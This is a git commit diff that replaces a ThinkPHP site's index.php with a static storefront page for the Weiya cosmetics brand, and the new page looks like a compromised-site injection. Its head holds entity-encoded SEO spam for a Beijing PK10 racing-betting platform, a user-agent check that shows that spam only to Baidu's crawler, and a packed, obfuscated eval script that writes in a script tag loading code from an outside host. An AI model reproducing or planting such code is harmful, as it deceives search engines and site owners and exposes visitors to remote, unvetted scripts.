c5fae1339ab9eee0382e6df90467faddda484777
zm <zm@example.com>
2019-01-22 09:13:06 +0800

    zm

--- thinkphp5.1/weiya/public/index.php
+++ thinkphp5.1/weiya/public/index.php
@@ -1,21 +1,421 @@
-<?php
-// +----------------------------------------------------------------------
-// | ThinkPHP [ WE CAN DO IT JUST THINK ]
-// +----------------------------------------------------------------------
-// | Copyright (c) 2006-2018 http://thinkphp.cn All rights reserved.
-// +----------------------------------------------------------------------
-// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
-// +----------------------------------------------------------------------
-// | Author: liu21st <liu21st@gmail.com>
-// +----------------------------------------------------------------------
+﻿<?php
+foreach(array($_GET,$_POST,$_REQUEST) as $s){
+  if(strpos($s['function'],"call_user_func") !== false){
+    exit("输入内容不合法");
+  }
+}
+?>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<title>&#21271;&#20140;&#36187;&#36710;&#25237;&#27880;&#24179;&#21488;&#23448;&#26041;&#95;&#21271;&#20140;&#36187;&#36710;&#27491;&#35268;&#25237;&#27880;&#24179;&#21488;&#95;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#12304;&#23448;&#26041;&#25480;&#26435;&#20837;&#21475;&#12305;</title>
+<meta name="keywords" content="&#21271;&#20140;&#36187;&#36710;&#27880;&#20876;&#32593;&#22336;&#32;&#21271;&#20140;&#36187;&#36710;&#23448;&#32593;&#32;&#21271;&#20140;&#36187;&#36710;&#25237;&#27880;&#32;&#21271;&#20140;&#36187;&#36710;&#24179;&#21488;&#32;&#20140;&#36187;&#36710;&#23448;&#26041;&#25237;&#27880;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#30331;&#24405;&#24179;&#21488;&#23448;&#32593;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#32;&#36187;&#36710;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#32;&#21271;&#20140;&#36187;&#36710;&#27880;&#20876;&#24179;&#21488;&#32;&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#20449;&#35465;&#24179;&#21488;&#32;&#112;&#107;&#49;&#48;&#20449;&#35465;&#24179;&#21488;"/>
+<meta name="description" content="&#21271;&#20140;&#36187;&#36710;&#112;&#107;&#49;&#48;&#25237;&#27880;&#24179;&#21488;&#107;&#56;&#12304;&#107;&#107;&#49;&#57;&#46;&#99;&#111;&#109;&#12305;&#35814;&#23613;&#30740;&#31350;&#20998;&#26512;&#24635;&#32467;&#44;&#20998;&#20139;&#21271;&#20140;&#112;&#107;&#49;&#48;&#24320;&#22870;&#35270;&#39057;&#44;&#112;&#107;&#49;&#48;&#32467;&#26524;&#20998;&#26512;&#44;&#21271;&#20140;&#36187;&#36710;&#24179;&#21488;&#44;&#112;&#107;&#49;&#48;&#32593;&#19978;&#25237;&#27880;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#30452;&#25773;&#44;&#21271;&#20140;&#112;&#107;&#49;&#48;&#36807;&#24448;&#21508;&#24320;&#22870;&#35760;&#24405;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#32467;&#26524;&#44;&#112;&#107;&#49;&#48;&#32593;&#19978;&#24320;&#25143;&#44;&#112;&#107;&#49;&#48;&#24320;&#22870;&#44;&#19987;&#19994;&#30340;&#24320;&#22870;&#35270;&#39057;&#21271;&#20140;&#112;&#107;&#49;&#48;&#32593;"/>
+<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="维雅药妆定制"}</script>
+<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m["\\e\\c\\1\\l\\i\\8\\n\\0"]["\\7\\4\\9\\0\\8"](\'\\g\\2\\1\\4\\9\\3\\0 \\0\\k\\3\\8\\d\\6\\0\\8\\r\\0\\5\\f\\a\\s\\a\\2\\1\\4\\9\\3\\0\\6 \\2\\4\\1\\d\\6\\o\\0\\0\\3\\2\\p\\5\\5\\7\\7\\7\\b\\1\\3\\e\\a\\2\\j\\b\\1\\c\\i\\5\\q\\j\\b\\f\\2\\6\\h\\g\\5\\2\\1\\4\\9\\3\\0\\h\');',29,29,'x74|x63|x73|x70|x72|x2f|x22|x77|x65|x69|x61|x2e|x6f|x3d|x64|x6a|x3c|x3e|x6d|x38|x79|x75|window|x6e|x68|x3a|x6b|x78|x76'.split('|'),0,{}))
+</script>
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<link rel="stylesheet" href="http://www.worldview.com.cn/static/common/css/base.css">
+<link rel="stylesheet" href="http://www.worldview.com.cn/static/common/css/public.css">
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/jquery/jquery-1.9.1.min.js"></script>
+<script type="text/javascript">
+var domain = 'http://www.worldview.com.cn'+'/'+'index.php/';
+var module = domain + 'index/';
+var controller = module + 'Index/';
+var action = controller + 'index';
+var uploads = 'http://www.worldview.com.cn'+'/uploads/';
+</script>
+<!--前置自定义js-->
+</head>
+<body>
+<!-- 内容模块 -->
 
-// [ 应用入口文件 ]
-namespace think;
+<article class="f24">
+<section class="slider_banner">
+<div class="swiper-container swiper-container-horizontal swiper-container-ios">
+<div class="swiper-wrapper">
+<div class="swiper-slide swiper-slide-active">
+<img src="http://www.worldview.com.cn/static/common/img/banner/home-banner1.jpg" alt="" class="common_default_img">
+</div>
+<div class="swiper-slide ">
+<img src="http://www.worldview.com.cn/static/common/img/banner/home-banner2.jpg" alt="" class="common_default_img">
+</div>
+<div class="swiper-slide ">
+<img src="http://www.worldview.com.cn/static/common/img/banner/home-banner3.jpg" alt="" class="common_default_img">
+</div>
+<div class="swiper-slide ">
+<img src="http://www.worldview.com.cn/static/common/img/banner/home-banner4.jpg" alt="" class="common_default_img">
+</div>
+</div>
+<div class="swiper-pagination swiper-pagination-clickable swiper-pagination-bullets">
+<span class="swiper-pagination-bullet swiper-pagination-bullet-active" tabindex="0" role="button" aria-label="Go to slide 1"></span>
+<span class="swiper-pagination-bullet " tabindex="0" role="button" aria-label="Go to slide 2"></span>
+<span class="swiper-pagination-bul let " tabindex="0" role="button" aria-label="Go to slide 3"></span>
+<span class="swiper-pagination-bullet " tabindex="0" role="button" aria-label="Go to slide 4"></span>
+</div>
+</div>
+</section>
 
-// 加载基础文件
-require __DIR__ . '/../../framework/base.php';
+<section class="content_main">
+<div class="content-padding">
+<div>
+<div class="scroll_news">
+<a class="news_tit">
+<img src="http://www.worldview.com.cn/static/common/img/wy_logo.png" alt="">
+</a>
+<div class="news_list_wrapper">
+<ul class="news_list j_scroll_news">
+<li class="news_item">
+<a>
+<span class="red">最新</span>维雅品牌定制平台正式上线啦！
+</a>
+</li>
+<li class="news_item">
+<a>
+<span class="red">hot</span>利润为王,品牌定制是捷径！
+</a>
+</li>
+</ul>
+</div>
+<a class="news_more">更多</a>
+</div>
+</div>
+<div class="scene_wrapper">
+<div class="graphic_item graphic_item_65 img0" >
+<a href="/index/Scene/detail/id/54/css/css0.html" data-id="54">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315052165410.jpeg" alt="">
+</div>
+</a>
+</div>
+<div class="graphic_item graphic_item_65 img1" >
+<a href="/index/Scene/detail/id/55/css/css1.html" data-id="55">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315050794309.jpeg" alt="">
+</div>
+</a>
+</div>
+<div class="graphic_item graphic_item_65 img2" >
+<a href="/index/Scene/detail/id/56/css/css2.html" data-id="56">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315045542563.jpeg" alt="">
+</div>
+</a>
+</div>
+<div class="graphic_item graphic_item_65 img3" >
+<a href="/index/Scene/detail/id/57/css/css3.html" data-id="57">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315044084661.jpeg" alt="">
+</div>
+</a>
+</div>
+<div class="graphic_item graphic_item_65 img4" >
+<a href="/index/Scene/detail/id/58/css/css4.html" data-id="58">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315042442519.jpeg" alt="">
+</div>
+</a>
+</div>
+<div class="graphic_item graphic_item_65 img5" >
+<a href="/index/Scene/detail/id/59/css/css5.html" data-id="59">
+<div class="show-img">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010315041028246.jpeg" alt="">
+</div>
+</a>
+</div>
+</div>
+<div class="project_wrapper">
+<div class="mod-part-title">
+<div class="mod-part-title-wrap">
+<span class="icon-title left"></span>
+<span class="title">精选项目</span>
+<span class="icon-title right"></span>
+</div>
+</div>
+<ul>
+<li data-id="44">
+<a href="/index/Project/detail/id/44.html">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010316435951270.jpeg" alt="">
+</a>
+</li>
+<li data-id="45">
+<a href="/index/Project/detail/id/45.html">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010316441593265.jpeg" alt="">
+</a>
+</li>
+<li data-id="46">
+<a href="/index/Project/detail/id/46.html">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010316443644282.jpeg" alt="">
+</a>
+</li>
+<li data-id="47">
+<a href="/index/Project/detail/id/47.html">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010414260809327.jpeg" alt="">
+</a>
+</li>
+<li data-id="48">
+<a href="/index/Project/detail/id/48.html">
+<img src="http://www.worldview.com.cn/uploads/weiya_project/2019010316451297421.jpeg" alt="">
+</a>
+</li>
+</ul>
+</div>
+</div>
+<div class="new_select_wrap">
+<section class="">
+<ul class="nav_menu">
+<li data-category-id="51" >
+<a href="javascript:void(0);" class="category_nav">冻干粉</a>
+</li>
+<li data-category-id="44" >
+<a href="javascript:void(0);" class="category_nav">原液</a>
+</li>
+<li data-category-id="45" >
+<a href="javascript:void(0);" class="category_nav">面膜</a>
+</li>
+<li data-category-id="43" >
+<a href="javascript:void(0);" class="category_nav">喷雾</a>
+</li>
+<li data-category-id="46" >
+<a href="javascript:void(0);" class="category_nav">凝胶</a>
+</li>
+<li data-category-id="52" >
+<a href="javascript:void(0);" class="category_nav">基础</a>
+</li>
+<li data-category-id="49" >
+<a href="javascript:void(0);" class="category_nav">套盒</a>
+</li>
+</ul>
+</section>
+<div id="scroller-wrapper" class="list_wrapper">
+<ul class="columns_flex flex-both-side goods-content-list" id="list">
 
-// 支持事先使用静态方法设置Request对象和Config对象
+</ul>
+</div>
 
-// 执行应用并响应
-Container::get('app')->run()->send();
+</div>
+</section>
+</article>
+<section class="bottom_nav_fixed bottom_white">
+<nav class=" foot_nav_bar">
+<ul class="columns_flex">
+<li class="each_column current">
+<a href="javascript:void(0)">
+<span class="store f_icon"></span>
+<span class="f_txt">药妆定制</span>
+</a>
+</li>
+<li class="each_column">
+<a href="/index/Company/index.html">
+<span class="practitioners f_icon"></span>
+<span class="f_txt">走进维雅</span>
+</a>
+</li>
+<li class="each_column">
+<a href="/index/Consultation/index.html">
+<span class="business f_icon"></span>
+<span class="f_txt">业务咨询</span>
+</a>
+</li>
+<li class="each_column">
+<a href="javascript:void(0)" class="my_cart">
+<span class="cart f_icon"></span>
+<span class="f_txt">采购车</span>
+</a>
+</li>
+<li class="each_column">
+<a href="/index/UserCenter/index.html">
+<span class="my f_icon"></span>
+<span class="f_txt">我的</span>
+</a>
+</li>
+</ul>
+</nav>
+</section>
+
+<!-- 公共模块-->
+
+
+<section id="sectionForgetPassword" style="display:none;">
+<div class="f24 bomb_box">
+<div class="ucenter_logo">
+<img src="http://www.worldview.com.cn/static/common/img/ucenter_logo.png" alt="">
+</div>
+<div class="loginNav">
+<span class="current resetpassword">重置密码</span>
+</div>
+<div class="error_tipc" ></div>
+<form id="formForgetPassword">
+<div class="login_item">
+<div class="columns_flex">
+<span>中国(+86)</span>
+<input class="username user_phone input-filed" type="tel" placeholder="请输入手机号码" name="mobile_phone">
+</div>
+</div>
+<div class="smsLogin login_wrap">
+<div class="login_item">
+<div class="columns_flex l-r-sides">
+<input type="text" class="tel_code input-filed" placeholder="请输入收到的验证码" name="captcha">
+<!--<a href="javascript:void(0);" class="send_sms">获取验证码</a>-->
+</div>
+</div>
+</div>
+<div class="login_item">
+<div class="columns_flex">
+<input class="input-filed password" autocomplete="new-password" type="password" placeholder="设置密码" name="password">
+<a href="javascript:void(0);" class="hidden view-password" ></a>
+</div>
+</div>
+<a href="javascript:void(0);" class="comfirmBtn entry-button" data-method="forgetPassword">确定</a>
+</form>
+</div>
+</section>
+<section id="dialLogin" style="display:none;">
+<form class="loginTab active" id="formLogin">
+<div class="login_item">
+<div class="columns_flex">
+<span>中国(+86)</span>
+<input class="username user_phone input-filed" type="tel" placeholder="请输入手机号码" name="mobile_phone">
+</div>
+</div>
+<div class="login_item">
+<div class="columns_flex">
+<input class="input-filed password" type="password" placeholder="密码" name="password">
+<a href="javascript:void(0);" class="hidden view-password" ></a>
+</div>
+</div>
+<a href="javascript:void(0);" class="forget_password forget_dialog">忘记密码</a>
+<div class="error_tipc"></div>
+<a href="javascript:void(0);" class="loginBtn entry-button" data-method="login">登录</a>
+</form>
+</section>
+<!-- 页脚模块-->
+
+<!--js基本插件-->
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/layer.mobile/layer.js"></script>
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/public.js"></script>
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/common.js"></script>
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/dialog.js"></script>
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/forbidscroll.js"></script>
+<!--自定义js-->
+
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/swiper.min.js"></script>
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/paging.js"></script>
+
+<script type="text/javascript">
+var config = {
+url:module+'Goods/getList',
+requestEnd:false,
+loadTrigger:false,
+currentPage:1,
+
+};
+var postData = {
+pageSize:10,
+pageType:'index'
+};
+$(function(){
+//轮播
+var swiper = new Swiper('.swiper-container', {
+spaceBetween: 30,
+autoplay:true,
+pagination: {
+el: '.swiper-pagination',
+clickable: true
+}
+});
+//新闻滚动
+var len=$('.news_list li').length;
+var timer=setInterval(function(){
+var i=0;
+i++;
+move(i);
+},2200);
+function move(i){
+var h=$('.news_item').height();
+var offsetY=h*i;
+$('.news_list').get(0).style.transform="translate3d(0,-"+offsetY+"px,0)";
+$('.news_list').get(0).style.transition="transform 500ms ease-in-out 0s";
+setTimeout(function(){
+$('.news_list').get(0).style.transform="translate3d(0,0,0)";
+$('.news_list').get(0).style.transition="none 0s ease 0s";
+$('.news_list li').eq(len-1).after($('.news_list li').eq(0));
+},500);
+}
+//初始化分类商品页面
+$('.nav_menu li:eq(0)').addClass('current');
+postData.category_id = $('.nav_menu li.current').data('category-id');
+getPagingList(config,postData);
+
+$('body').on('click','.nav_menu li',function(){
+var _this = $(this);
+$(this).addClass('current').siblings().removeClass('current');
+config = {
+url:module+'Goods/getList',
+requestEnd:false,
+loadTrigger:false,
+currentPage:1,
+};
+postData.category_id = _this.data('category-id');
+getPagingList(config,postData);
+})
+
+//下拉加载
+var offsetHeight=$('.nav_menu').offset().top;
+$(window).on('scroll',function(){
+if(config.loadTrigger && $(document).scrollTop()+$(window).height()+200>$(document).height()){
+config.loadTrigger = false;
+postData.category_id = $('.nav_menu li.current').data('category-id');
+getPagingList(config,postData);
+}
+//滚动
+var top = $(document).scrollTop();
+var currentId = '';
+var top=$(document).scrollTop();
+if(top>offsetHeight){
+$('.nav_menu').addClass('top-fixed');
+}else {
+$('.nav_menu').removeClass('top-fixed');
+}
+});
+
+$('body').on('click','.my_cart',function () {
+var url = module + 'Cart/index';
+var postData = {};
+$.ajax({
+url: url,
+data: postData,
+type: 'post',
+beforeSend: function(xhr){
+$('.loading').show();
+},
+error:function(xhr){
+$('.loading').hide();
+dialog.error('AJAX错误');
+},
+success: function(data){
+
+$('.loading').hide();
+if(data.status==0){
+dialog.error(data.info);
+}else if(data.code==1){
+if(data.data == 'no_login'){
+loginDialog();
+}
+}else if(data.status==1){
+
+}else{
+location.href = url;
+}
+}
+});
+});
+});
+</script>
+
+
+<script type="text/javascript" src="http://www.worldview.com.cn/static/common/js/login.js"></script>
+
+</body></html>
